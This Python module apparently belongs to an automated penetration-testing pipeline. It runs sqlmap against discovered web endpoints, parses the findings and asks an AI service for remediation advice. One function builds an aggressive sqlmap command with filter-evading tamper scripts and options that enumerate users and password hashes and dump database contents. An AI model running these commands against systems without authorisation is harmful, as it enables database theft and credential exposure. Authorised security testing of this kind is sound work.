#  services/phases/sqli_testing.py
import os
import json
import re
import logging
from datetime import datetime
from typing import Dict, Any, List, Optional
from services.utils.system import run_command
from services.utils.output_manager import get_output_manager
from models import Phase, Job
from services.ai.ai_service import init_ai_service
from services.ai.rag_service import init_exploit_rag_service

logger = logging.getLogger(__name__)
ai_service = init_ai_service()
rag_service = init_exploit_rag_service()


def run_sqlmap(url: str, output_dir: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
    """
    Run SQLMap against a target URL.
    """
    os.makedirs(output_dir, exist_ok=True)
    
    # Clean URL for filename
    safe_url = url.replace(':', '_').replace('/', '_').replace('?', '_').replace('&', '_')
    output_file = os.path.join(output_dir, f"sqlmap_{safe_url}.txt")
    
    # Build SQLMap command
    cmd = [
        'sqlmap',
        '-u', url,
        '--batch',  # Never ask for user input
        '--random-agent',
        '--level=1',
        '--risk=1',
        '--threads=5',
        '--timeout=30',
        '--retries=2',
        '-o',  # Turn on all optimization switches
    ]
    
    # Add additional parameters if provided
    if params:
        if params.get('data'):
            cmd.extend(['--data', params['data']])
        if params.get('cookie'):
            cmd.extend(['--cookie', params['cookie']])
        if params.get('method'):
            cmd.extend(['--method', params['method']])
        if params.get('headers'):
            for header, value in params['headers'].items():
                cmd.extend(['--header', f"{header}: {value}"])
    
    logger.info(f"Running SQLMap on {url}...")
    result = run_command(cmd, timeout=300)  # 5 minute timeout per URL
    
    # Save output
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(result.get('stdout', ''))
        f.write('\n--- STDERR ---\n')
        f.write(result.get('stderr', ''))
    
    # Parse SQLMap output
    output = result.get('stdout', '')
    
    vulnerable = 'is vulnerable' in output.lower() or 'injectable' in output.lower()
    injection_type = None
    dbms = None
    
    # Extract injection type
    if vulnerable:
        # Look for injection type
        type_match = re.search(r'Type: ([\w\s]+)', output)
        if type_match:
            injection_type = type_match.group(1).strip()
        
        # Look for DBMS
        dbms_match = re.search(r'back-end DBMS: ([\w\s\.]+)', output, re.IGNORECASE)
        if dbms_match:
            dbms = dbms_match.group(1).strip()
    
    result = {
        'url': url,
        'vulnerable': vulnerable,
        'output_file': output_file,
        'raw_output': output,  # KEEP THIS
        'injection_type': injection_type,
        'dbms': dbms,
        'return_code': result.get('returncode', -1)
    }
    
    return result


def analyze_sqli_result_with_ai(sqli_result: Dict[str, Any]) -> Dict[str, Any]:
    """
    Use AI to analyze SQLi test results and provide recommendations.
    """
    url = sqli_result.get('url', '')
    vulnerable = sqli_result.get('vulnerable', False)
    injection_type = sqli_result.get('injection_type', 'N/A')
    dbms = sqli_result.get('dbms', 'Unknown')
    
    if not vulnerable:
        return {
            'url': url,
            'vulnerable': False,
            'ai_analysis': 'No SQL injection vulnerability detected.',
            'severity': 'None',
            'recommendations': ['Continue monitoring this endpoint for future vulnerabilities.']
        }
    
    # Generate AI analysis for vulnerable endpoint
    prompt = f"""
A SQL injection vulnerability was found:

URL: {url}
Injection Type: {injection_type}
Database: {dbms}

Provide:
1. Severity level (Critical/High/Medium/Low)
2. Detailed explanation of the vulnerability
3. Potential impact on the application
4. Step-by-step remediation recommendations
5. Code examples for secure implementation

Format as JSON:
{{
    "severity": "Critical",
    "explanation": "...",
    "impact": "...",
    "remediation_steps": ["step 1", "step 2"],
    "code_examples": "..."
}}
"""
    
    ai_response = ai_service.generate(prompt)
    
    try:
        analysis = json.loads(ai_response)
    except json.JSONDecodeError:
        analysis = {
            'severity': 'High',
            'explanation': ai_response,
            'impact': 'SQL injection can lead to data breach, data manipulation, and complete system compromise.',
            'remediation_steps': [
                'Use parameterized queries',
                'Implement input validation',
                'Apply principle of least privilege'
            ],
            'code_examples': 'Use prepared statements with parameter binding.'
        }
    
    return {
        'url': url,
        'vulnerable': True,
        'injection_type': injection_type,
        'dbms': dbms,
        'ai_analysis': analysis,
        'severity': analysis.get('severity', 'High')
    }


def identify_sql_injection_endpoints(web_enum_data: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Identify potential SQL injection endpoints from web enumeration results.
    """
    potential_endpoints = []
    
    # Look for common SQL injection patterns in discovered paths
    sql_patterns = [
        r'id=\d+', r'user=\w+', r'search=\w+', r'category=\w+',
        r'product=\w+', r'page=\d+', r'limit=\d+', r'offset=\d+',
        r'filter=\w+', r'sort=\w+', r'order=\w+'
    ]
    
    discovered_paths = web_enum_data.get('dirsearch_results', {}).get('discovered_paths', [])
    
    for path in discovered_paths:
        url = path.get('url', '')
        status = path.get('status', 0)
        
        # Only test 200 status codes
        if status == 200:
            for pattern in sql_patterns:
                if re.search(pattern, url):
                    potential_endpoints.append({
                        'url': url,
                        'parameter': re.search(pattern, url).group(),
                        'status': status,
                        'confidence': 'Medium',
                        'reason': f'Contains parameter pattern: {pattern}',
                    })
    
    # Also check for common vulnerable endpoints
    vulnerable_endpoints = [
        '/login.php', '/search.php', '/product.php', '/user.php',
        '/admin/login.php', '/api/users', '/api/products',
        '/index.php', '/home.php', '/profile.php'
    ]
    
    for path in discovered_paths:
        url = path.get('url', '')
        status = path.get('status', 0)
        
        if status == 200:
            for vuln_endpoint in vulnerable_endpoints:
                if vuln_endpoint in url:
                    potential_endpoints.append({
                        'url': url,
                        'parameter': 'Multiple parameters possible',
                        'status': status,
                        'confidence': 'High',
                        'reason': f'Known vulnerable endpoint pattern: {vuln_endpoint}',
                    })
    
    # Remove duplicates and limit to top 3 as requested
    unique_endpoints = []
    seen_urls = set()
    
    for endpoint in potential_endpoints:
        if endpoint['url'] not in seen_urls:
            unique_endpoints.append(endpoint)
            seen_urls.add(endpoint['url'])
            if len(unique_endpoints) >= 3:
                break
    
    return unique_endpoints


def run_sqlmap_test(endpoint: Dict[str, Any], output_dir: str) -> Dict[str, Any]:
    """
    Run sqlmap on a specific endpoint with comprehensive testing.
    """
    url = endpoint['url']
    safe_url = url.replace(':', '_').replace('/', '_').replace('?', '_').replace('&', '_')
    output_file = os.path.join(output_dir, f"sqlmap_{safe_url}.json")
    
    # Create output directory if it doesn't exist
    os.makedirs(output_dir, exist_ok=True)
    
    # Enhanced sqlmap command with better options
    cmd = [
        "sqlmap",
        "-u", url,
        "--batch",  # Non-interactive mode
        "--risk", "2",  # Medium risk level
        "--level", "3",  # Medium level
        "--output-dir", output_dir,
        "--format", "json",
        "--timeout", "30",
        "--retries", "1",
        "--threads", "1",
        "--tamper", "space2comment,equaltolike,greatest",  # Use tamper scripts
        "--technique", "BEUSTQ",  # Boolean, Error, Union, Stacked, Time-based, Query
        "--dbms", "mysql,postgresql,mssql,oracle",  # Test multiple DBMS
        "--os", "Windows,Linux",  # Test multiple OS
        "--banner",  # Get banner information
        "--current-user",  # Get current user
        "--current-db",  # Get current database
        "--is-dba",  # Check if user is DBA
        "--users",  # Enumerate users
        "--passwords",  # Enumerate passwords
        "--privileges",  # Enumerate privileges
        "--roles",  # Enumerate roles
        "--dbs",  # Enumerate databases
        "--tables",  # Enumerate tables
        "--columns",  # Enumerate columns
        "--dump",  # Dump data
        "--exclude-sysdbs",  # Exclude system databases
        "--fresh-queries",  # Use fresh queries
        "--hex",  # Use hex encoding
        "--no-cast",  # Disable casting
        "--no-escape",  # Disable escaping
        "--prefix", "'",  # Use single quote prefix
        "--suffix", "'",  # Use single quote suffix
        "--tamper", "space2comment,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,space2randomblank,unionalltounion,uppercase"
    ]
    
    logger.info(f"Running SQLMap on {url}...")
    result = run_command(cmd, timeout=900)  # 15 minute timeout
    
    # Parse sqlmap results
    sqlmap_results = {
        'url': url,
        'command': ' '.join(cmd),
        'return_code': result.get('returncode', -1),
        'stdout': result.get('stdout', ''),
        'stderr': result.get('stderr', ''),
        'vulnerable': False,
        'injection_type': None,
        'payloads': [],
        'database_info': {},
        'tables': [],
        'columns': [],
        'users': [],
        'databases': [],
        'is_dba': False,
        'current_user': None,
        'current_db': None,
        'banner': None,
        'techniques_used': [],
        'confidence': 0.0
    }
    
    stdout = result.get('stdout', '')
    
    # Check if sqlmap found vulnerabilities
    if any(phrase in stdout.lower() for phrase in [
        'sqlmap identified the following injection point',
        'sqlmap identified the following injection points',
        'parameter is vulnerable',
        'is vulnerable'
    ]):
        sqlmap_results['vulnerable'] = True
        
        # Extract injection type
        injection_patterns = [
            r'injection point.*?(\w+.*?injection)',
            r'parameter.*?is vulnerable to.*?(\w+.*?injection)',
            r'(\w+.*?injection).*?parameter'
        ]
        
        for pattern in injection_patterns:
            injection_match = re.search(pattern, stdout, re.IGNORECASE)
            if injection_match:
                sqlmap_results['injection_type'] = injection_match.group(1)
                break
        
        # Extract payloads
        payload_patterns = [
            r'Payload: (.+)',
            r'payload: (.+)',
            r'exploit: (.+)'
        ]
        
        for pattern in payload_patterns:
            payload_matches = re.findall(pattern, stdout, re.IGNORECASE)
            sqlmap_results['payloads'].extend(payload_matches[:10])  # Limit to 10 payloads
        
        # Extract database information
        db_patterns = [
            r'back-end DBMS: (.+)',
            r'database management system: (.+)',
            r'DBMS: (.+)'
        ]
        
        for pattern in db_patterns:
            db_match = re.search(pattern, stdout, re.IGNORECASE)
            if db_match:
                sqlmap_results['database_info']['type'] = db_match.group(1)
                break
        
        # Extract banner
        banner_match = re.search(r'banner: (.+)', stdout, re.IGNORECASE)
        if banner_match:
            sqlmap_results['banner'] = banner_match.group(1)
        
        # Extract current user
        user_match = re.search(r'current user: (.+)', stdout, re.IGNORECASE)
        if user_match:
            sqlmap_results['current_user'] = user_match.group(1)
        
        # Extract current database
        db_match = re.search(r'current database: (.+)', stdout, re.IGNORECASE)
        if db_match:
            sqlmap_results['current_db'] = db_match.group(1)
        
        # Check if user is DBA
        if 'is DBA' in stdout.lower() and 'true' in stdout.lower():
            sqlmap_results['is_dba'] = True
        
        # Extract confidence
        confidence_match = re.search(r'confidence: ([\d.]+)', stdout, re.IGNORECASE)
        if confidence_match:
            sqlmap_results['confidence'] = float(confidence_match.group(1))
        
        # Extract techniques used
        technique_patterns = [
            r'technique: (.+)',
            r'using (.+) technique',
            r'(.+) technique'
        ]
        
        for pattern in technique_patterns:
            technique_matches = re.findall(pattern, stdout, re.IGNORECASE)
            sqlmap_results['techniques_used'].extend(technique_matches)
        
        # Extract tables
        table_patterns = [
            r'table: (.+)',
            r'found table: (.+)',
            r'available tables: (.+)'
        ]
        
        for pattern in table_patterns:
            table_matches = re.findall(pattern, stdout, re.IGNORECASE)
            sqlmap_results['tables'].extend(table_matches)
        
        # Extract databases
        db_patterns = [
            r'database: (.+)',
            r'found database: (.+)',
            r'available databases: (.+)'
        ]
        
        for pattern in db_patterns:
            db_matches = re.findall(pattern, stdout, re.IGNORECASE)
            sqlmap_results['databases'].extend(db_matches)
        
        # Extract users
        user_patterns = [
            r'user: (.+)',
            r'found user: (.+)',
            r'available users: (.+)'
        ]
        
        for pattern in user_patterns:
            user_matches = re.findall(pattern, stdout, re.IGNORECASE)
            sqlmap_results['users'].extend(user_matches)
    
    # Remove duplicates and clean up
    sqlmap_results['payloads'] = list(set(sqlmap_results['payloads']))
    sqlmap_results['tables'] = list(set(sqlmap_results['tables']))
    sqlmap_results['databases'] = list(set(sqlmap_results['databases']))
    sqlmap_results['users'] = list(set(sqlmap_results['users']))
    sqlmap_results['techniques_used'] = list(set(sqlmap_results['techniques_used']))
    
    return sqlmap_results


def run_sqli_testing_phase(db_session, job: Job, web_enum_data: Dict[str, Any]) -> Optional[Phase]:
    """
    Run SQL injection testing phase using RAG-selected endpoints.
    """
    phase = Phase(
        job_id=job.id,
        phase_name="SQL Injection Testing",
        data={},
        log_path=None,
        status="ongoing",
    )
    db_session.add(phase)
    db_session.commit()
    db_session.refresh(phase)

    try:
        logger.info(f"[Job {job.id}] Starting SQL injection testing...")
        
        # Get SQLi candidates from web enumeration
        ai_rag_analysis = web_enum_data.get('ai_rag_analysis', {})
        sqli_candidates = ai_rag_analysis.get('sqli_candidates', [])
        
        if not sqli_candidates:
            phase.data = {
                'message': 'No SQL injection test candidates identified',
                'endpoints_tested': 0
            }
            phase.status = "success"
            phase.updated_at = datetime.now()
            db_session.add(phase)
            db_session.commit()
            db_session.refresh(phase)
            return phase
        
        # Create output directory
        output_dir = f"reports/{job.id}/sqli_testing"
        
        sqli_results = []
        vulnerable_count = 0
        
        # Test each candidate (limit to top 5 to avoid excessive testing time)
        for candidate in sqli_candidates[:5]:
            url = candidate.get('url', '')
            
            if not url:
                continue
            
            logger.info(f"[Job {job.id}] Testing {url} for SQL injection...")
            
            # Run SQLMap
            sqli_result = run_sqlmap(url, output_dir)
            
            # Analyze with AI
            ai_analysis = analyze_sqli_result_with_ai(sqli_result)
            
            # Combine results
            combined_result = {
                'url': url,
                'vulnerable': sqli_result['vulnerable'],
                'injection_type': sqli_result.get('injection_type'),
                'dbms': sqli_result.get('dbms'),
                'ai_analysis': ai_analysis.get('ai_analysis', {}),
                'severity': ai_analysis.get('severity', 'None'),
                'output_file': sqli_result.get('output_file'),
                'rag_reason': candidate.get('reason', ''),
                'rag_confidence': candidate.get('confidence', 0.0)
            }
            
            if sqli_result['vulnerable']:
                vulnerable_count += 1
                
                # Store in RAG for future reference
                try:
                    vuln_text = f"SQL injection found at {url}. Type: {sqli_result.get('injection_type')}. DBMS: {sqli_result.get('dbms')}."
                    rag_service.add_vulnerability(
                        vuln_id=f"sqli_{url}_{datetime.now().timestamp()}",
                        description=vuln_text,
                        metadata={
                            'type': 'sqli',
                            'severity': ai_analysis.get('severity', 'High'),
                            'url': url,
                            'dbms': sqli_result.get('dbms', 'Unknown')
                        }
                    )
                except Exception as e:
                    logger.error(f"[Job {job.id}] Error adding SQLi to RAG: {e}")
            
            sqli_results.append(combined_result)
        
        # Combine results
        combined_data = {
            'endpoints_tested': len(sqli_results),
            'vulnerable_endpoints': vulnerable_count,
            'safe_endpoints': len(sqli_results) - vulnerable_count,
            'sqli_results': sqli_results,
            'vulnerabilities_by_severity': {
                'critical': len([r for r in sqli_results if r.get('severity') == 'Critical']),
                'high': len([r for r in sqli_results if r.get('severity') == 'High']),
                'medium': len([r for r in sqli_results if r.get('severity') == 'Medium']),
                'low': len([r for r in sqli_results if r.get('severity') == 'Low']),
            },
            'testing_timestamp': datetime.now().isoformat(),
        }

        phase.data = combined_data
        phase.status = "success"
        phase.updated_at = datetime.now()
        db_session.add(phase)
        db_session.commit()
        db_session.refresh(phase)

        logger.info(f"[Job {job.id}] SQL injection testing completed.")
        logger.info(f"[Job {job.id}] Tested {len(sqli_results)} endpoints")
        logger.info(f"[Job {job.id}] Found {vulnerable_count} vulnerable endpoints")
        
        return phase
        
    except Exception as e:
        import traceback
        phase.data = {
            "error": str(e),
            "traceback": traceback.format_exc()
        }
        phase.status = "failed"
        phase.updated_at = datetime.now()
        db_session.add(phase)
        db_session.commit()
        db_session.refresh(phase)
        logger.error(f"[Job {job.id}] SQL injection testing failed: {str(e)}", exc_info=True)
        return phase

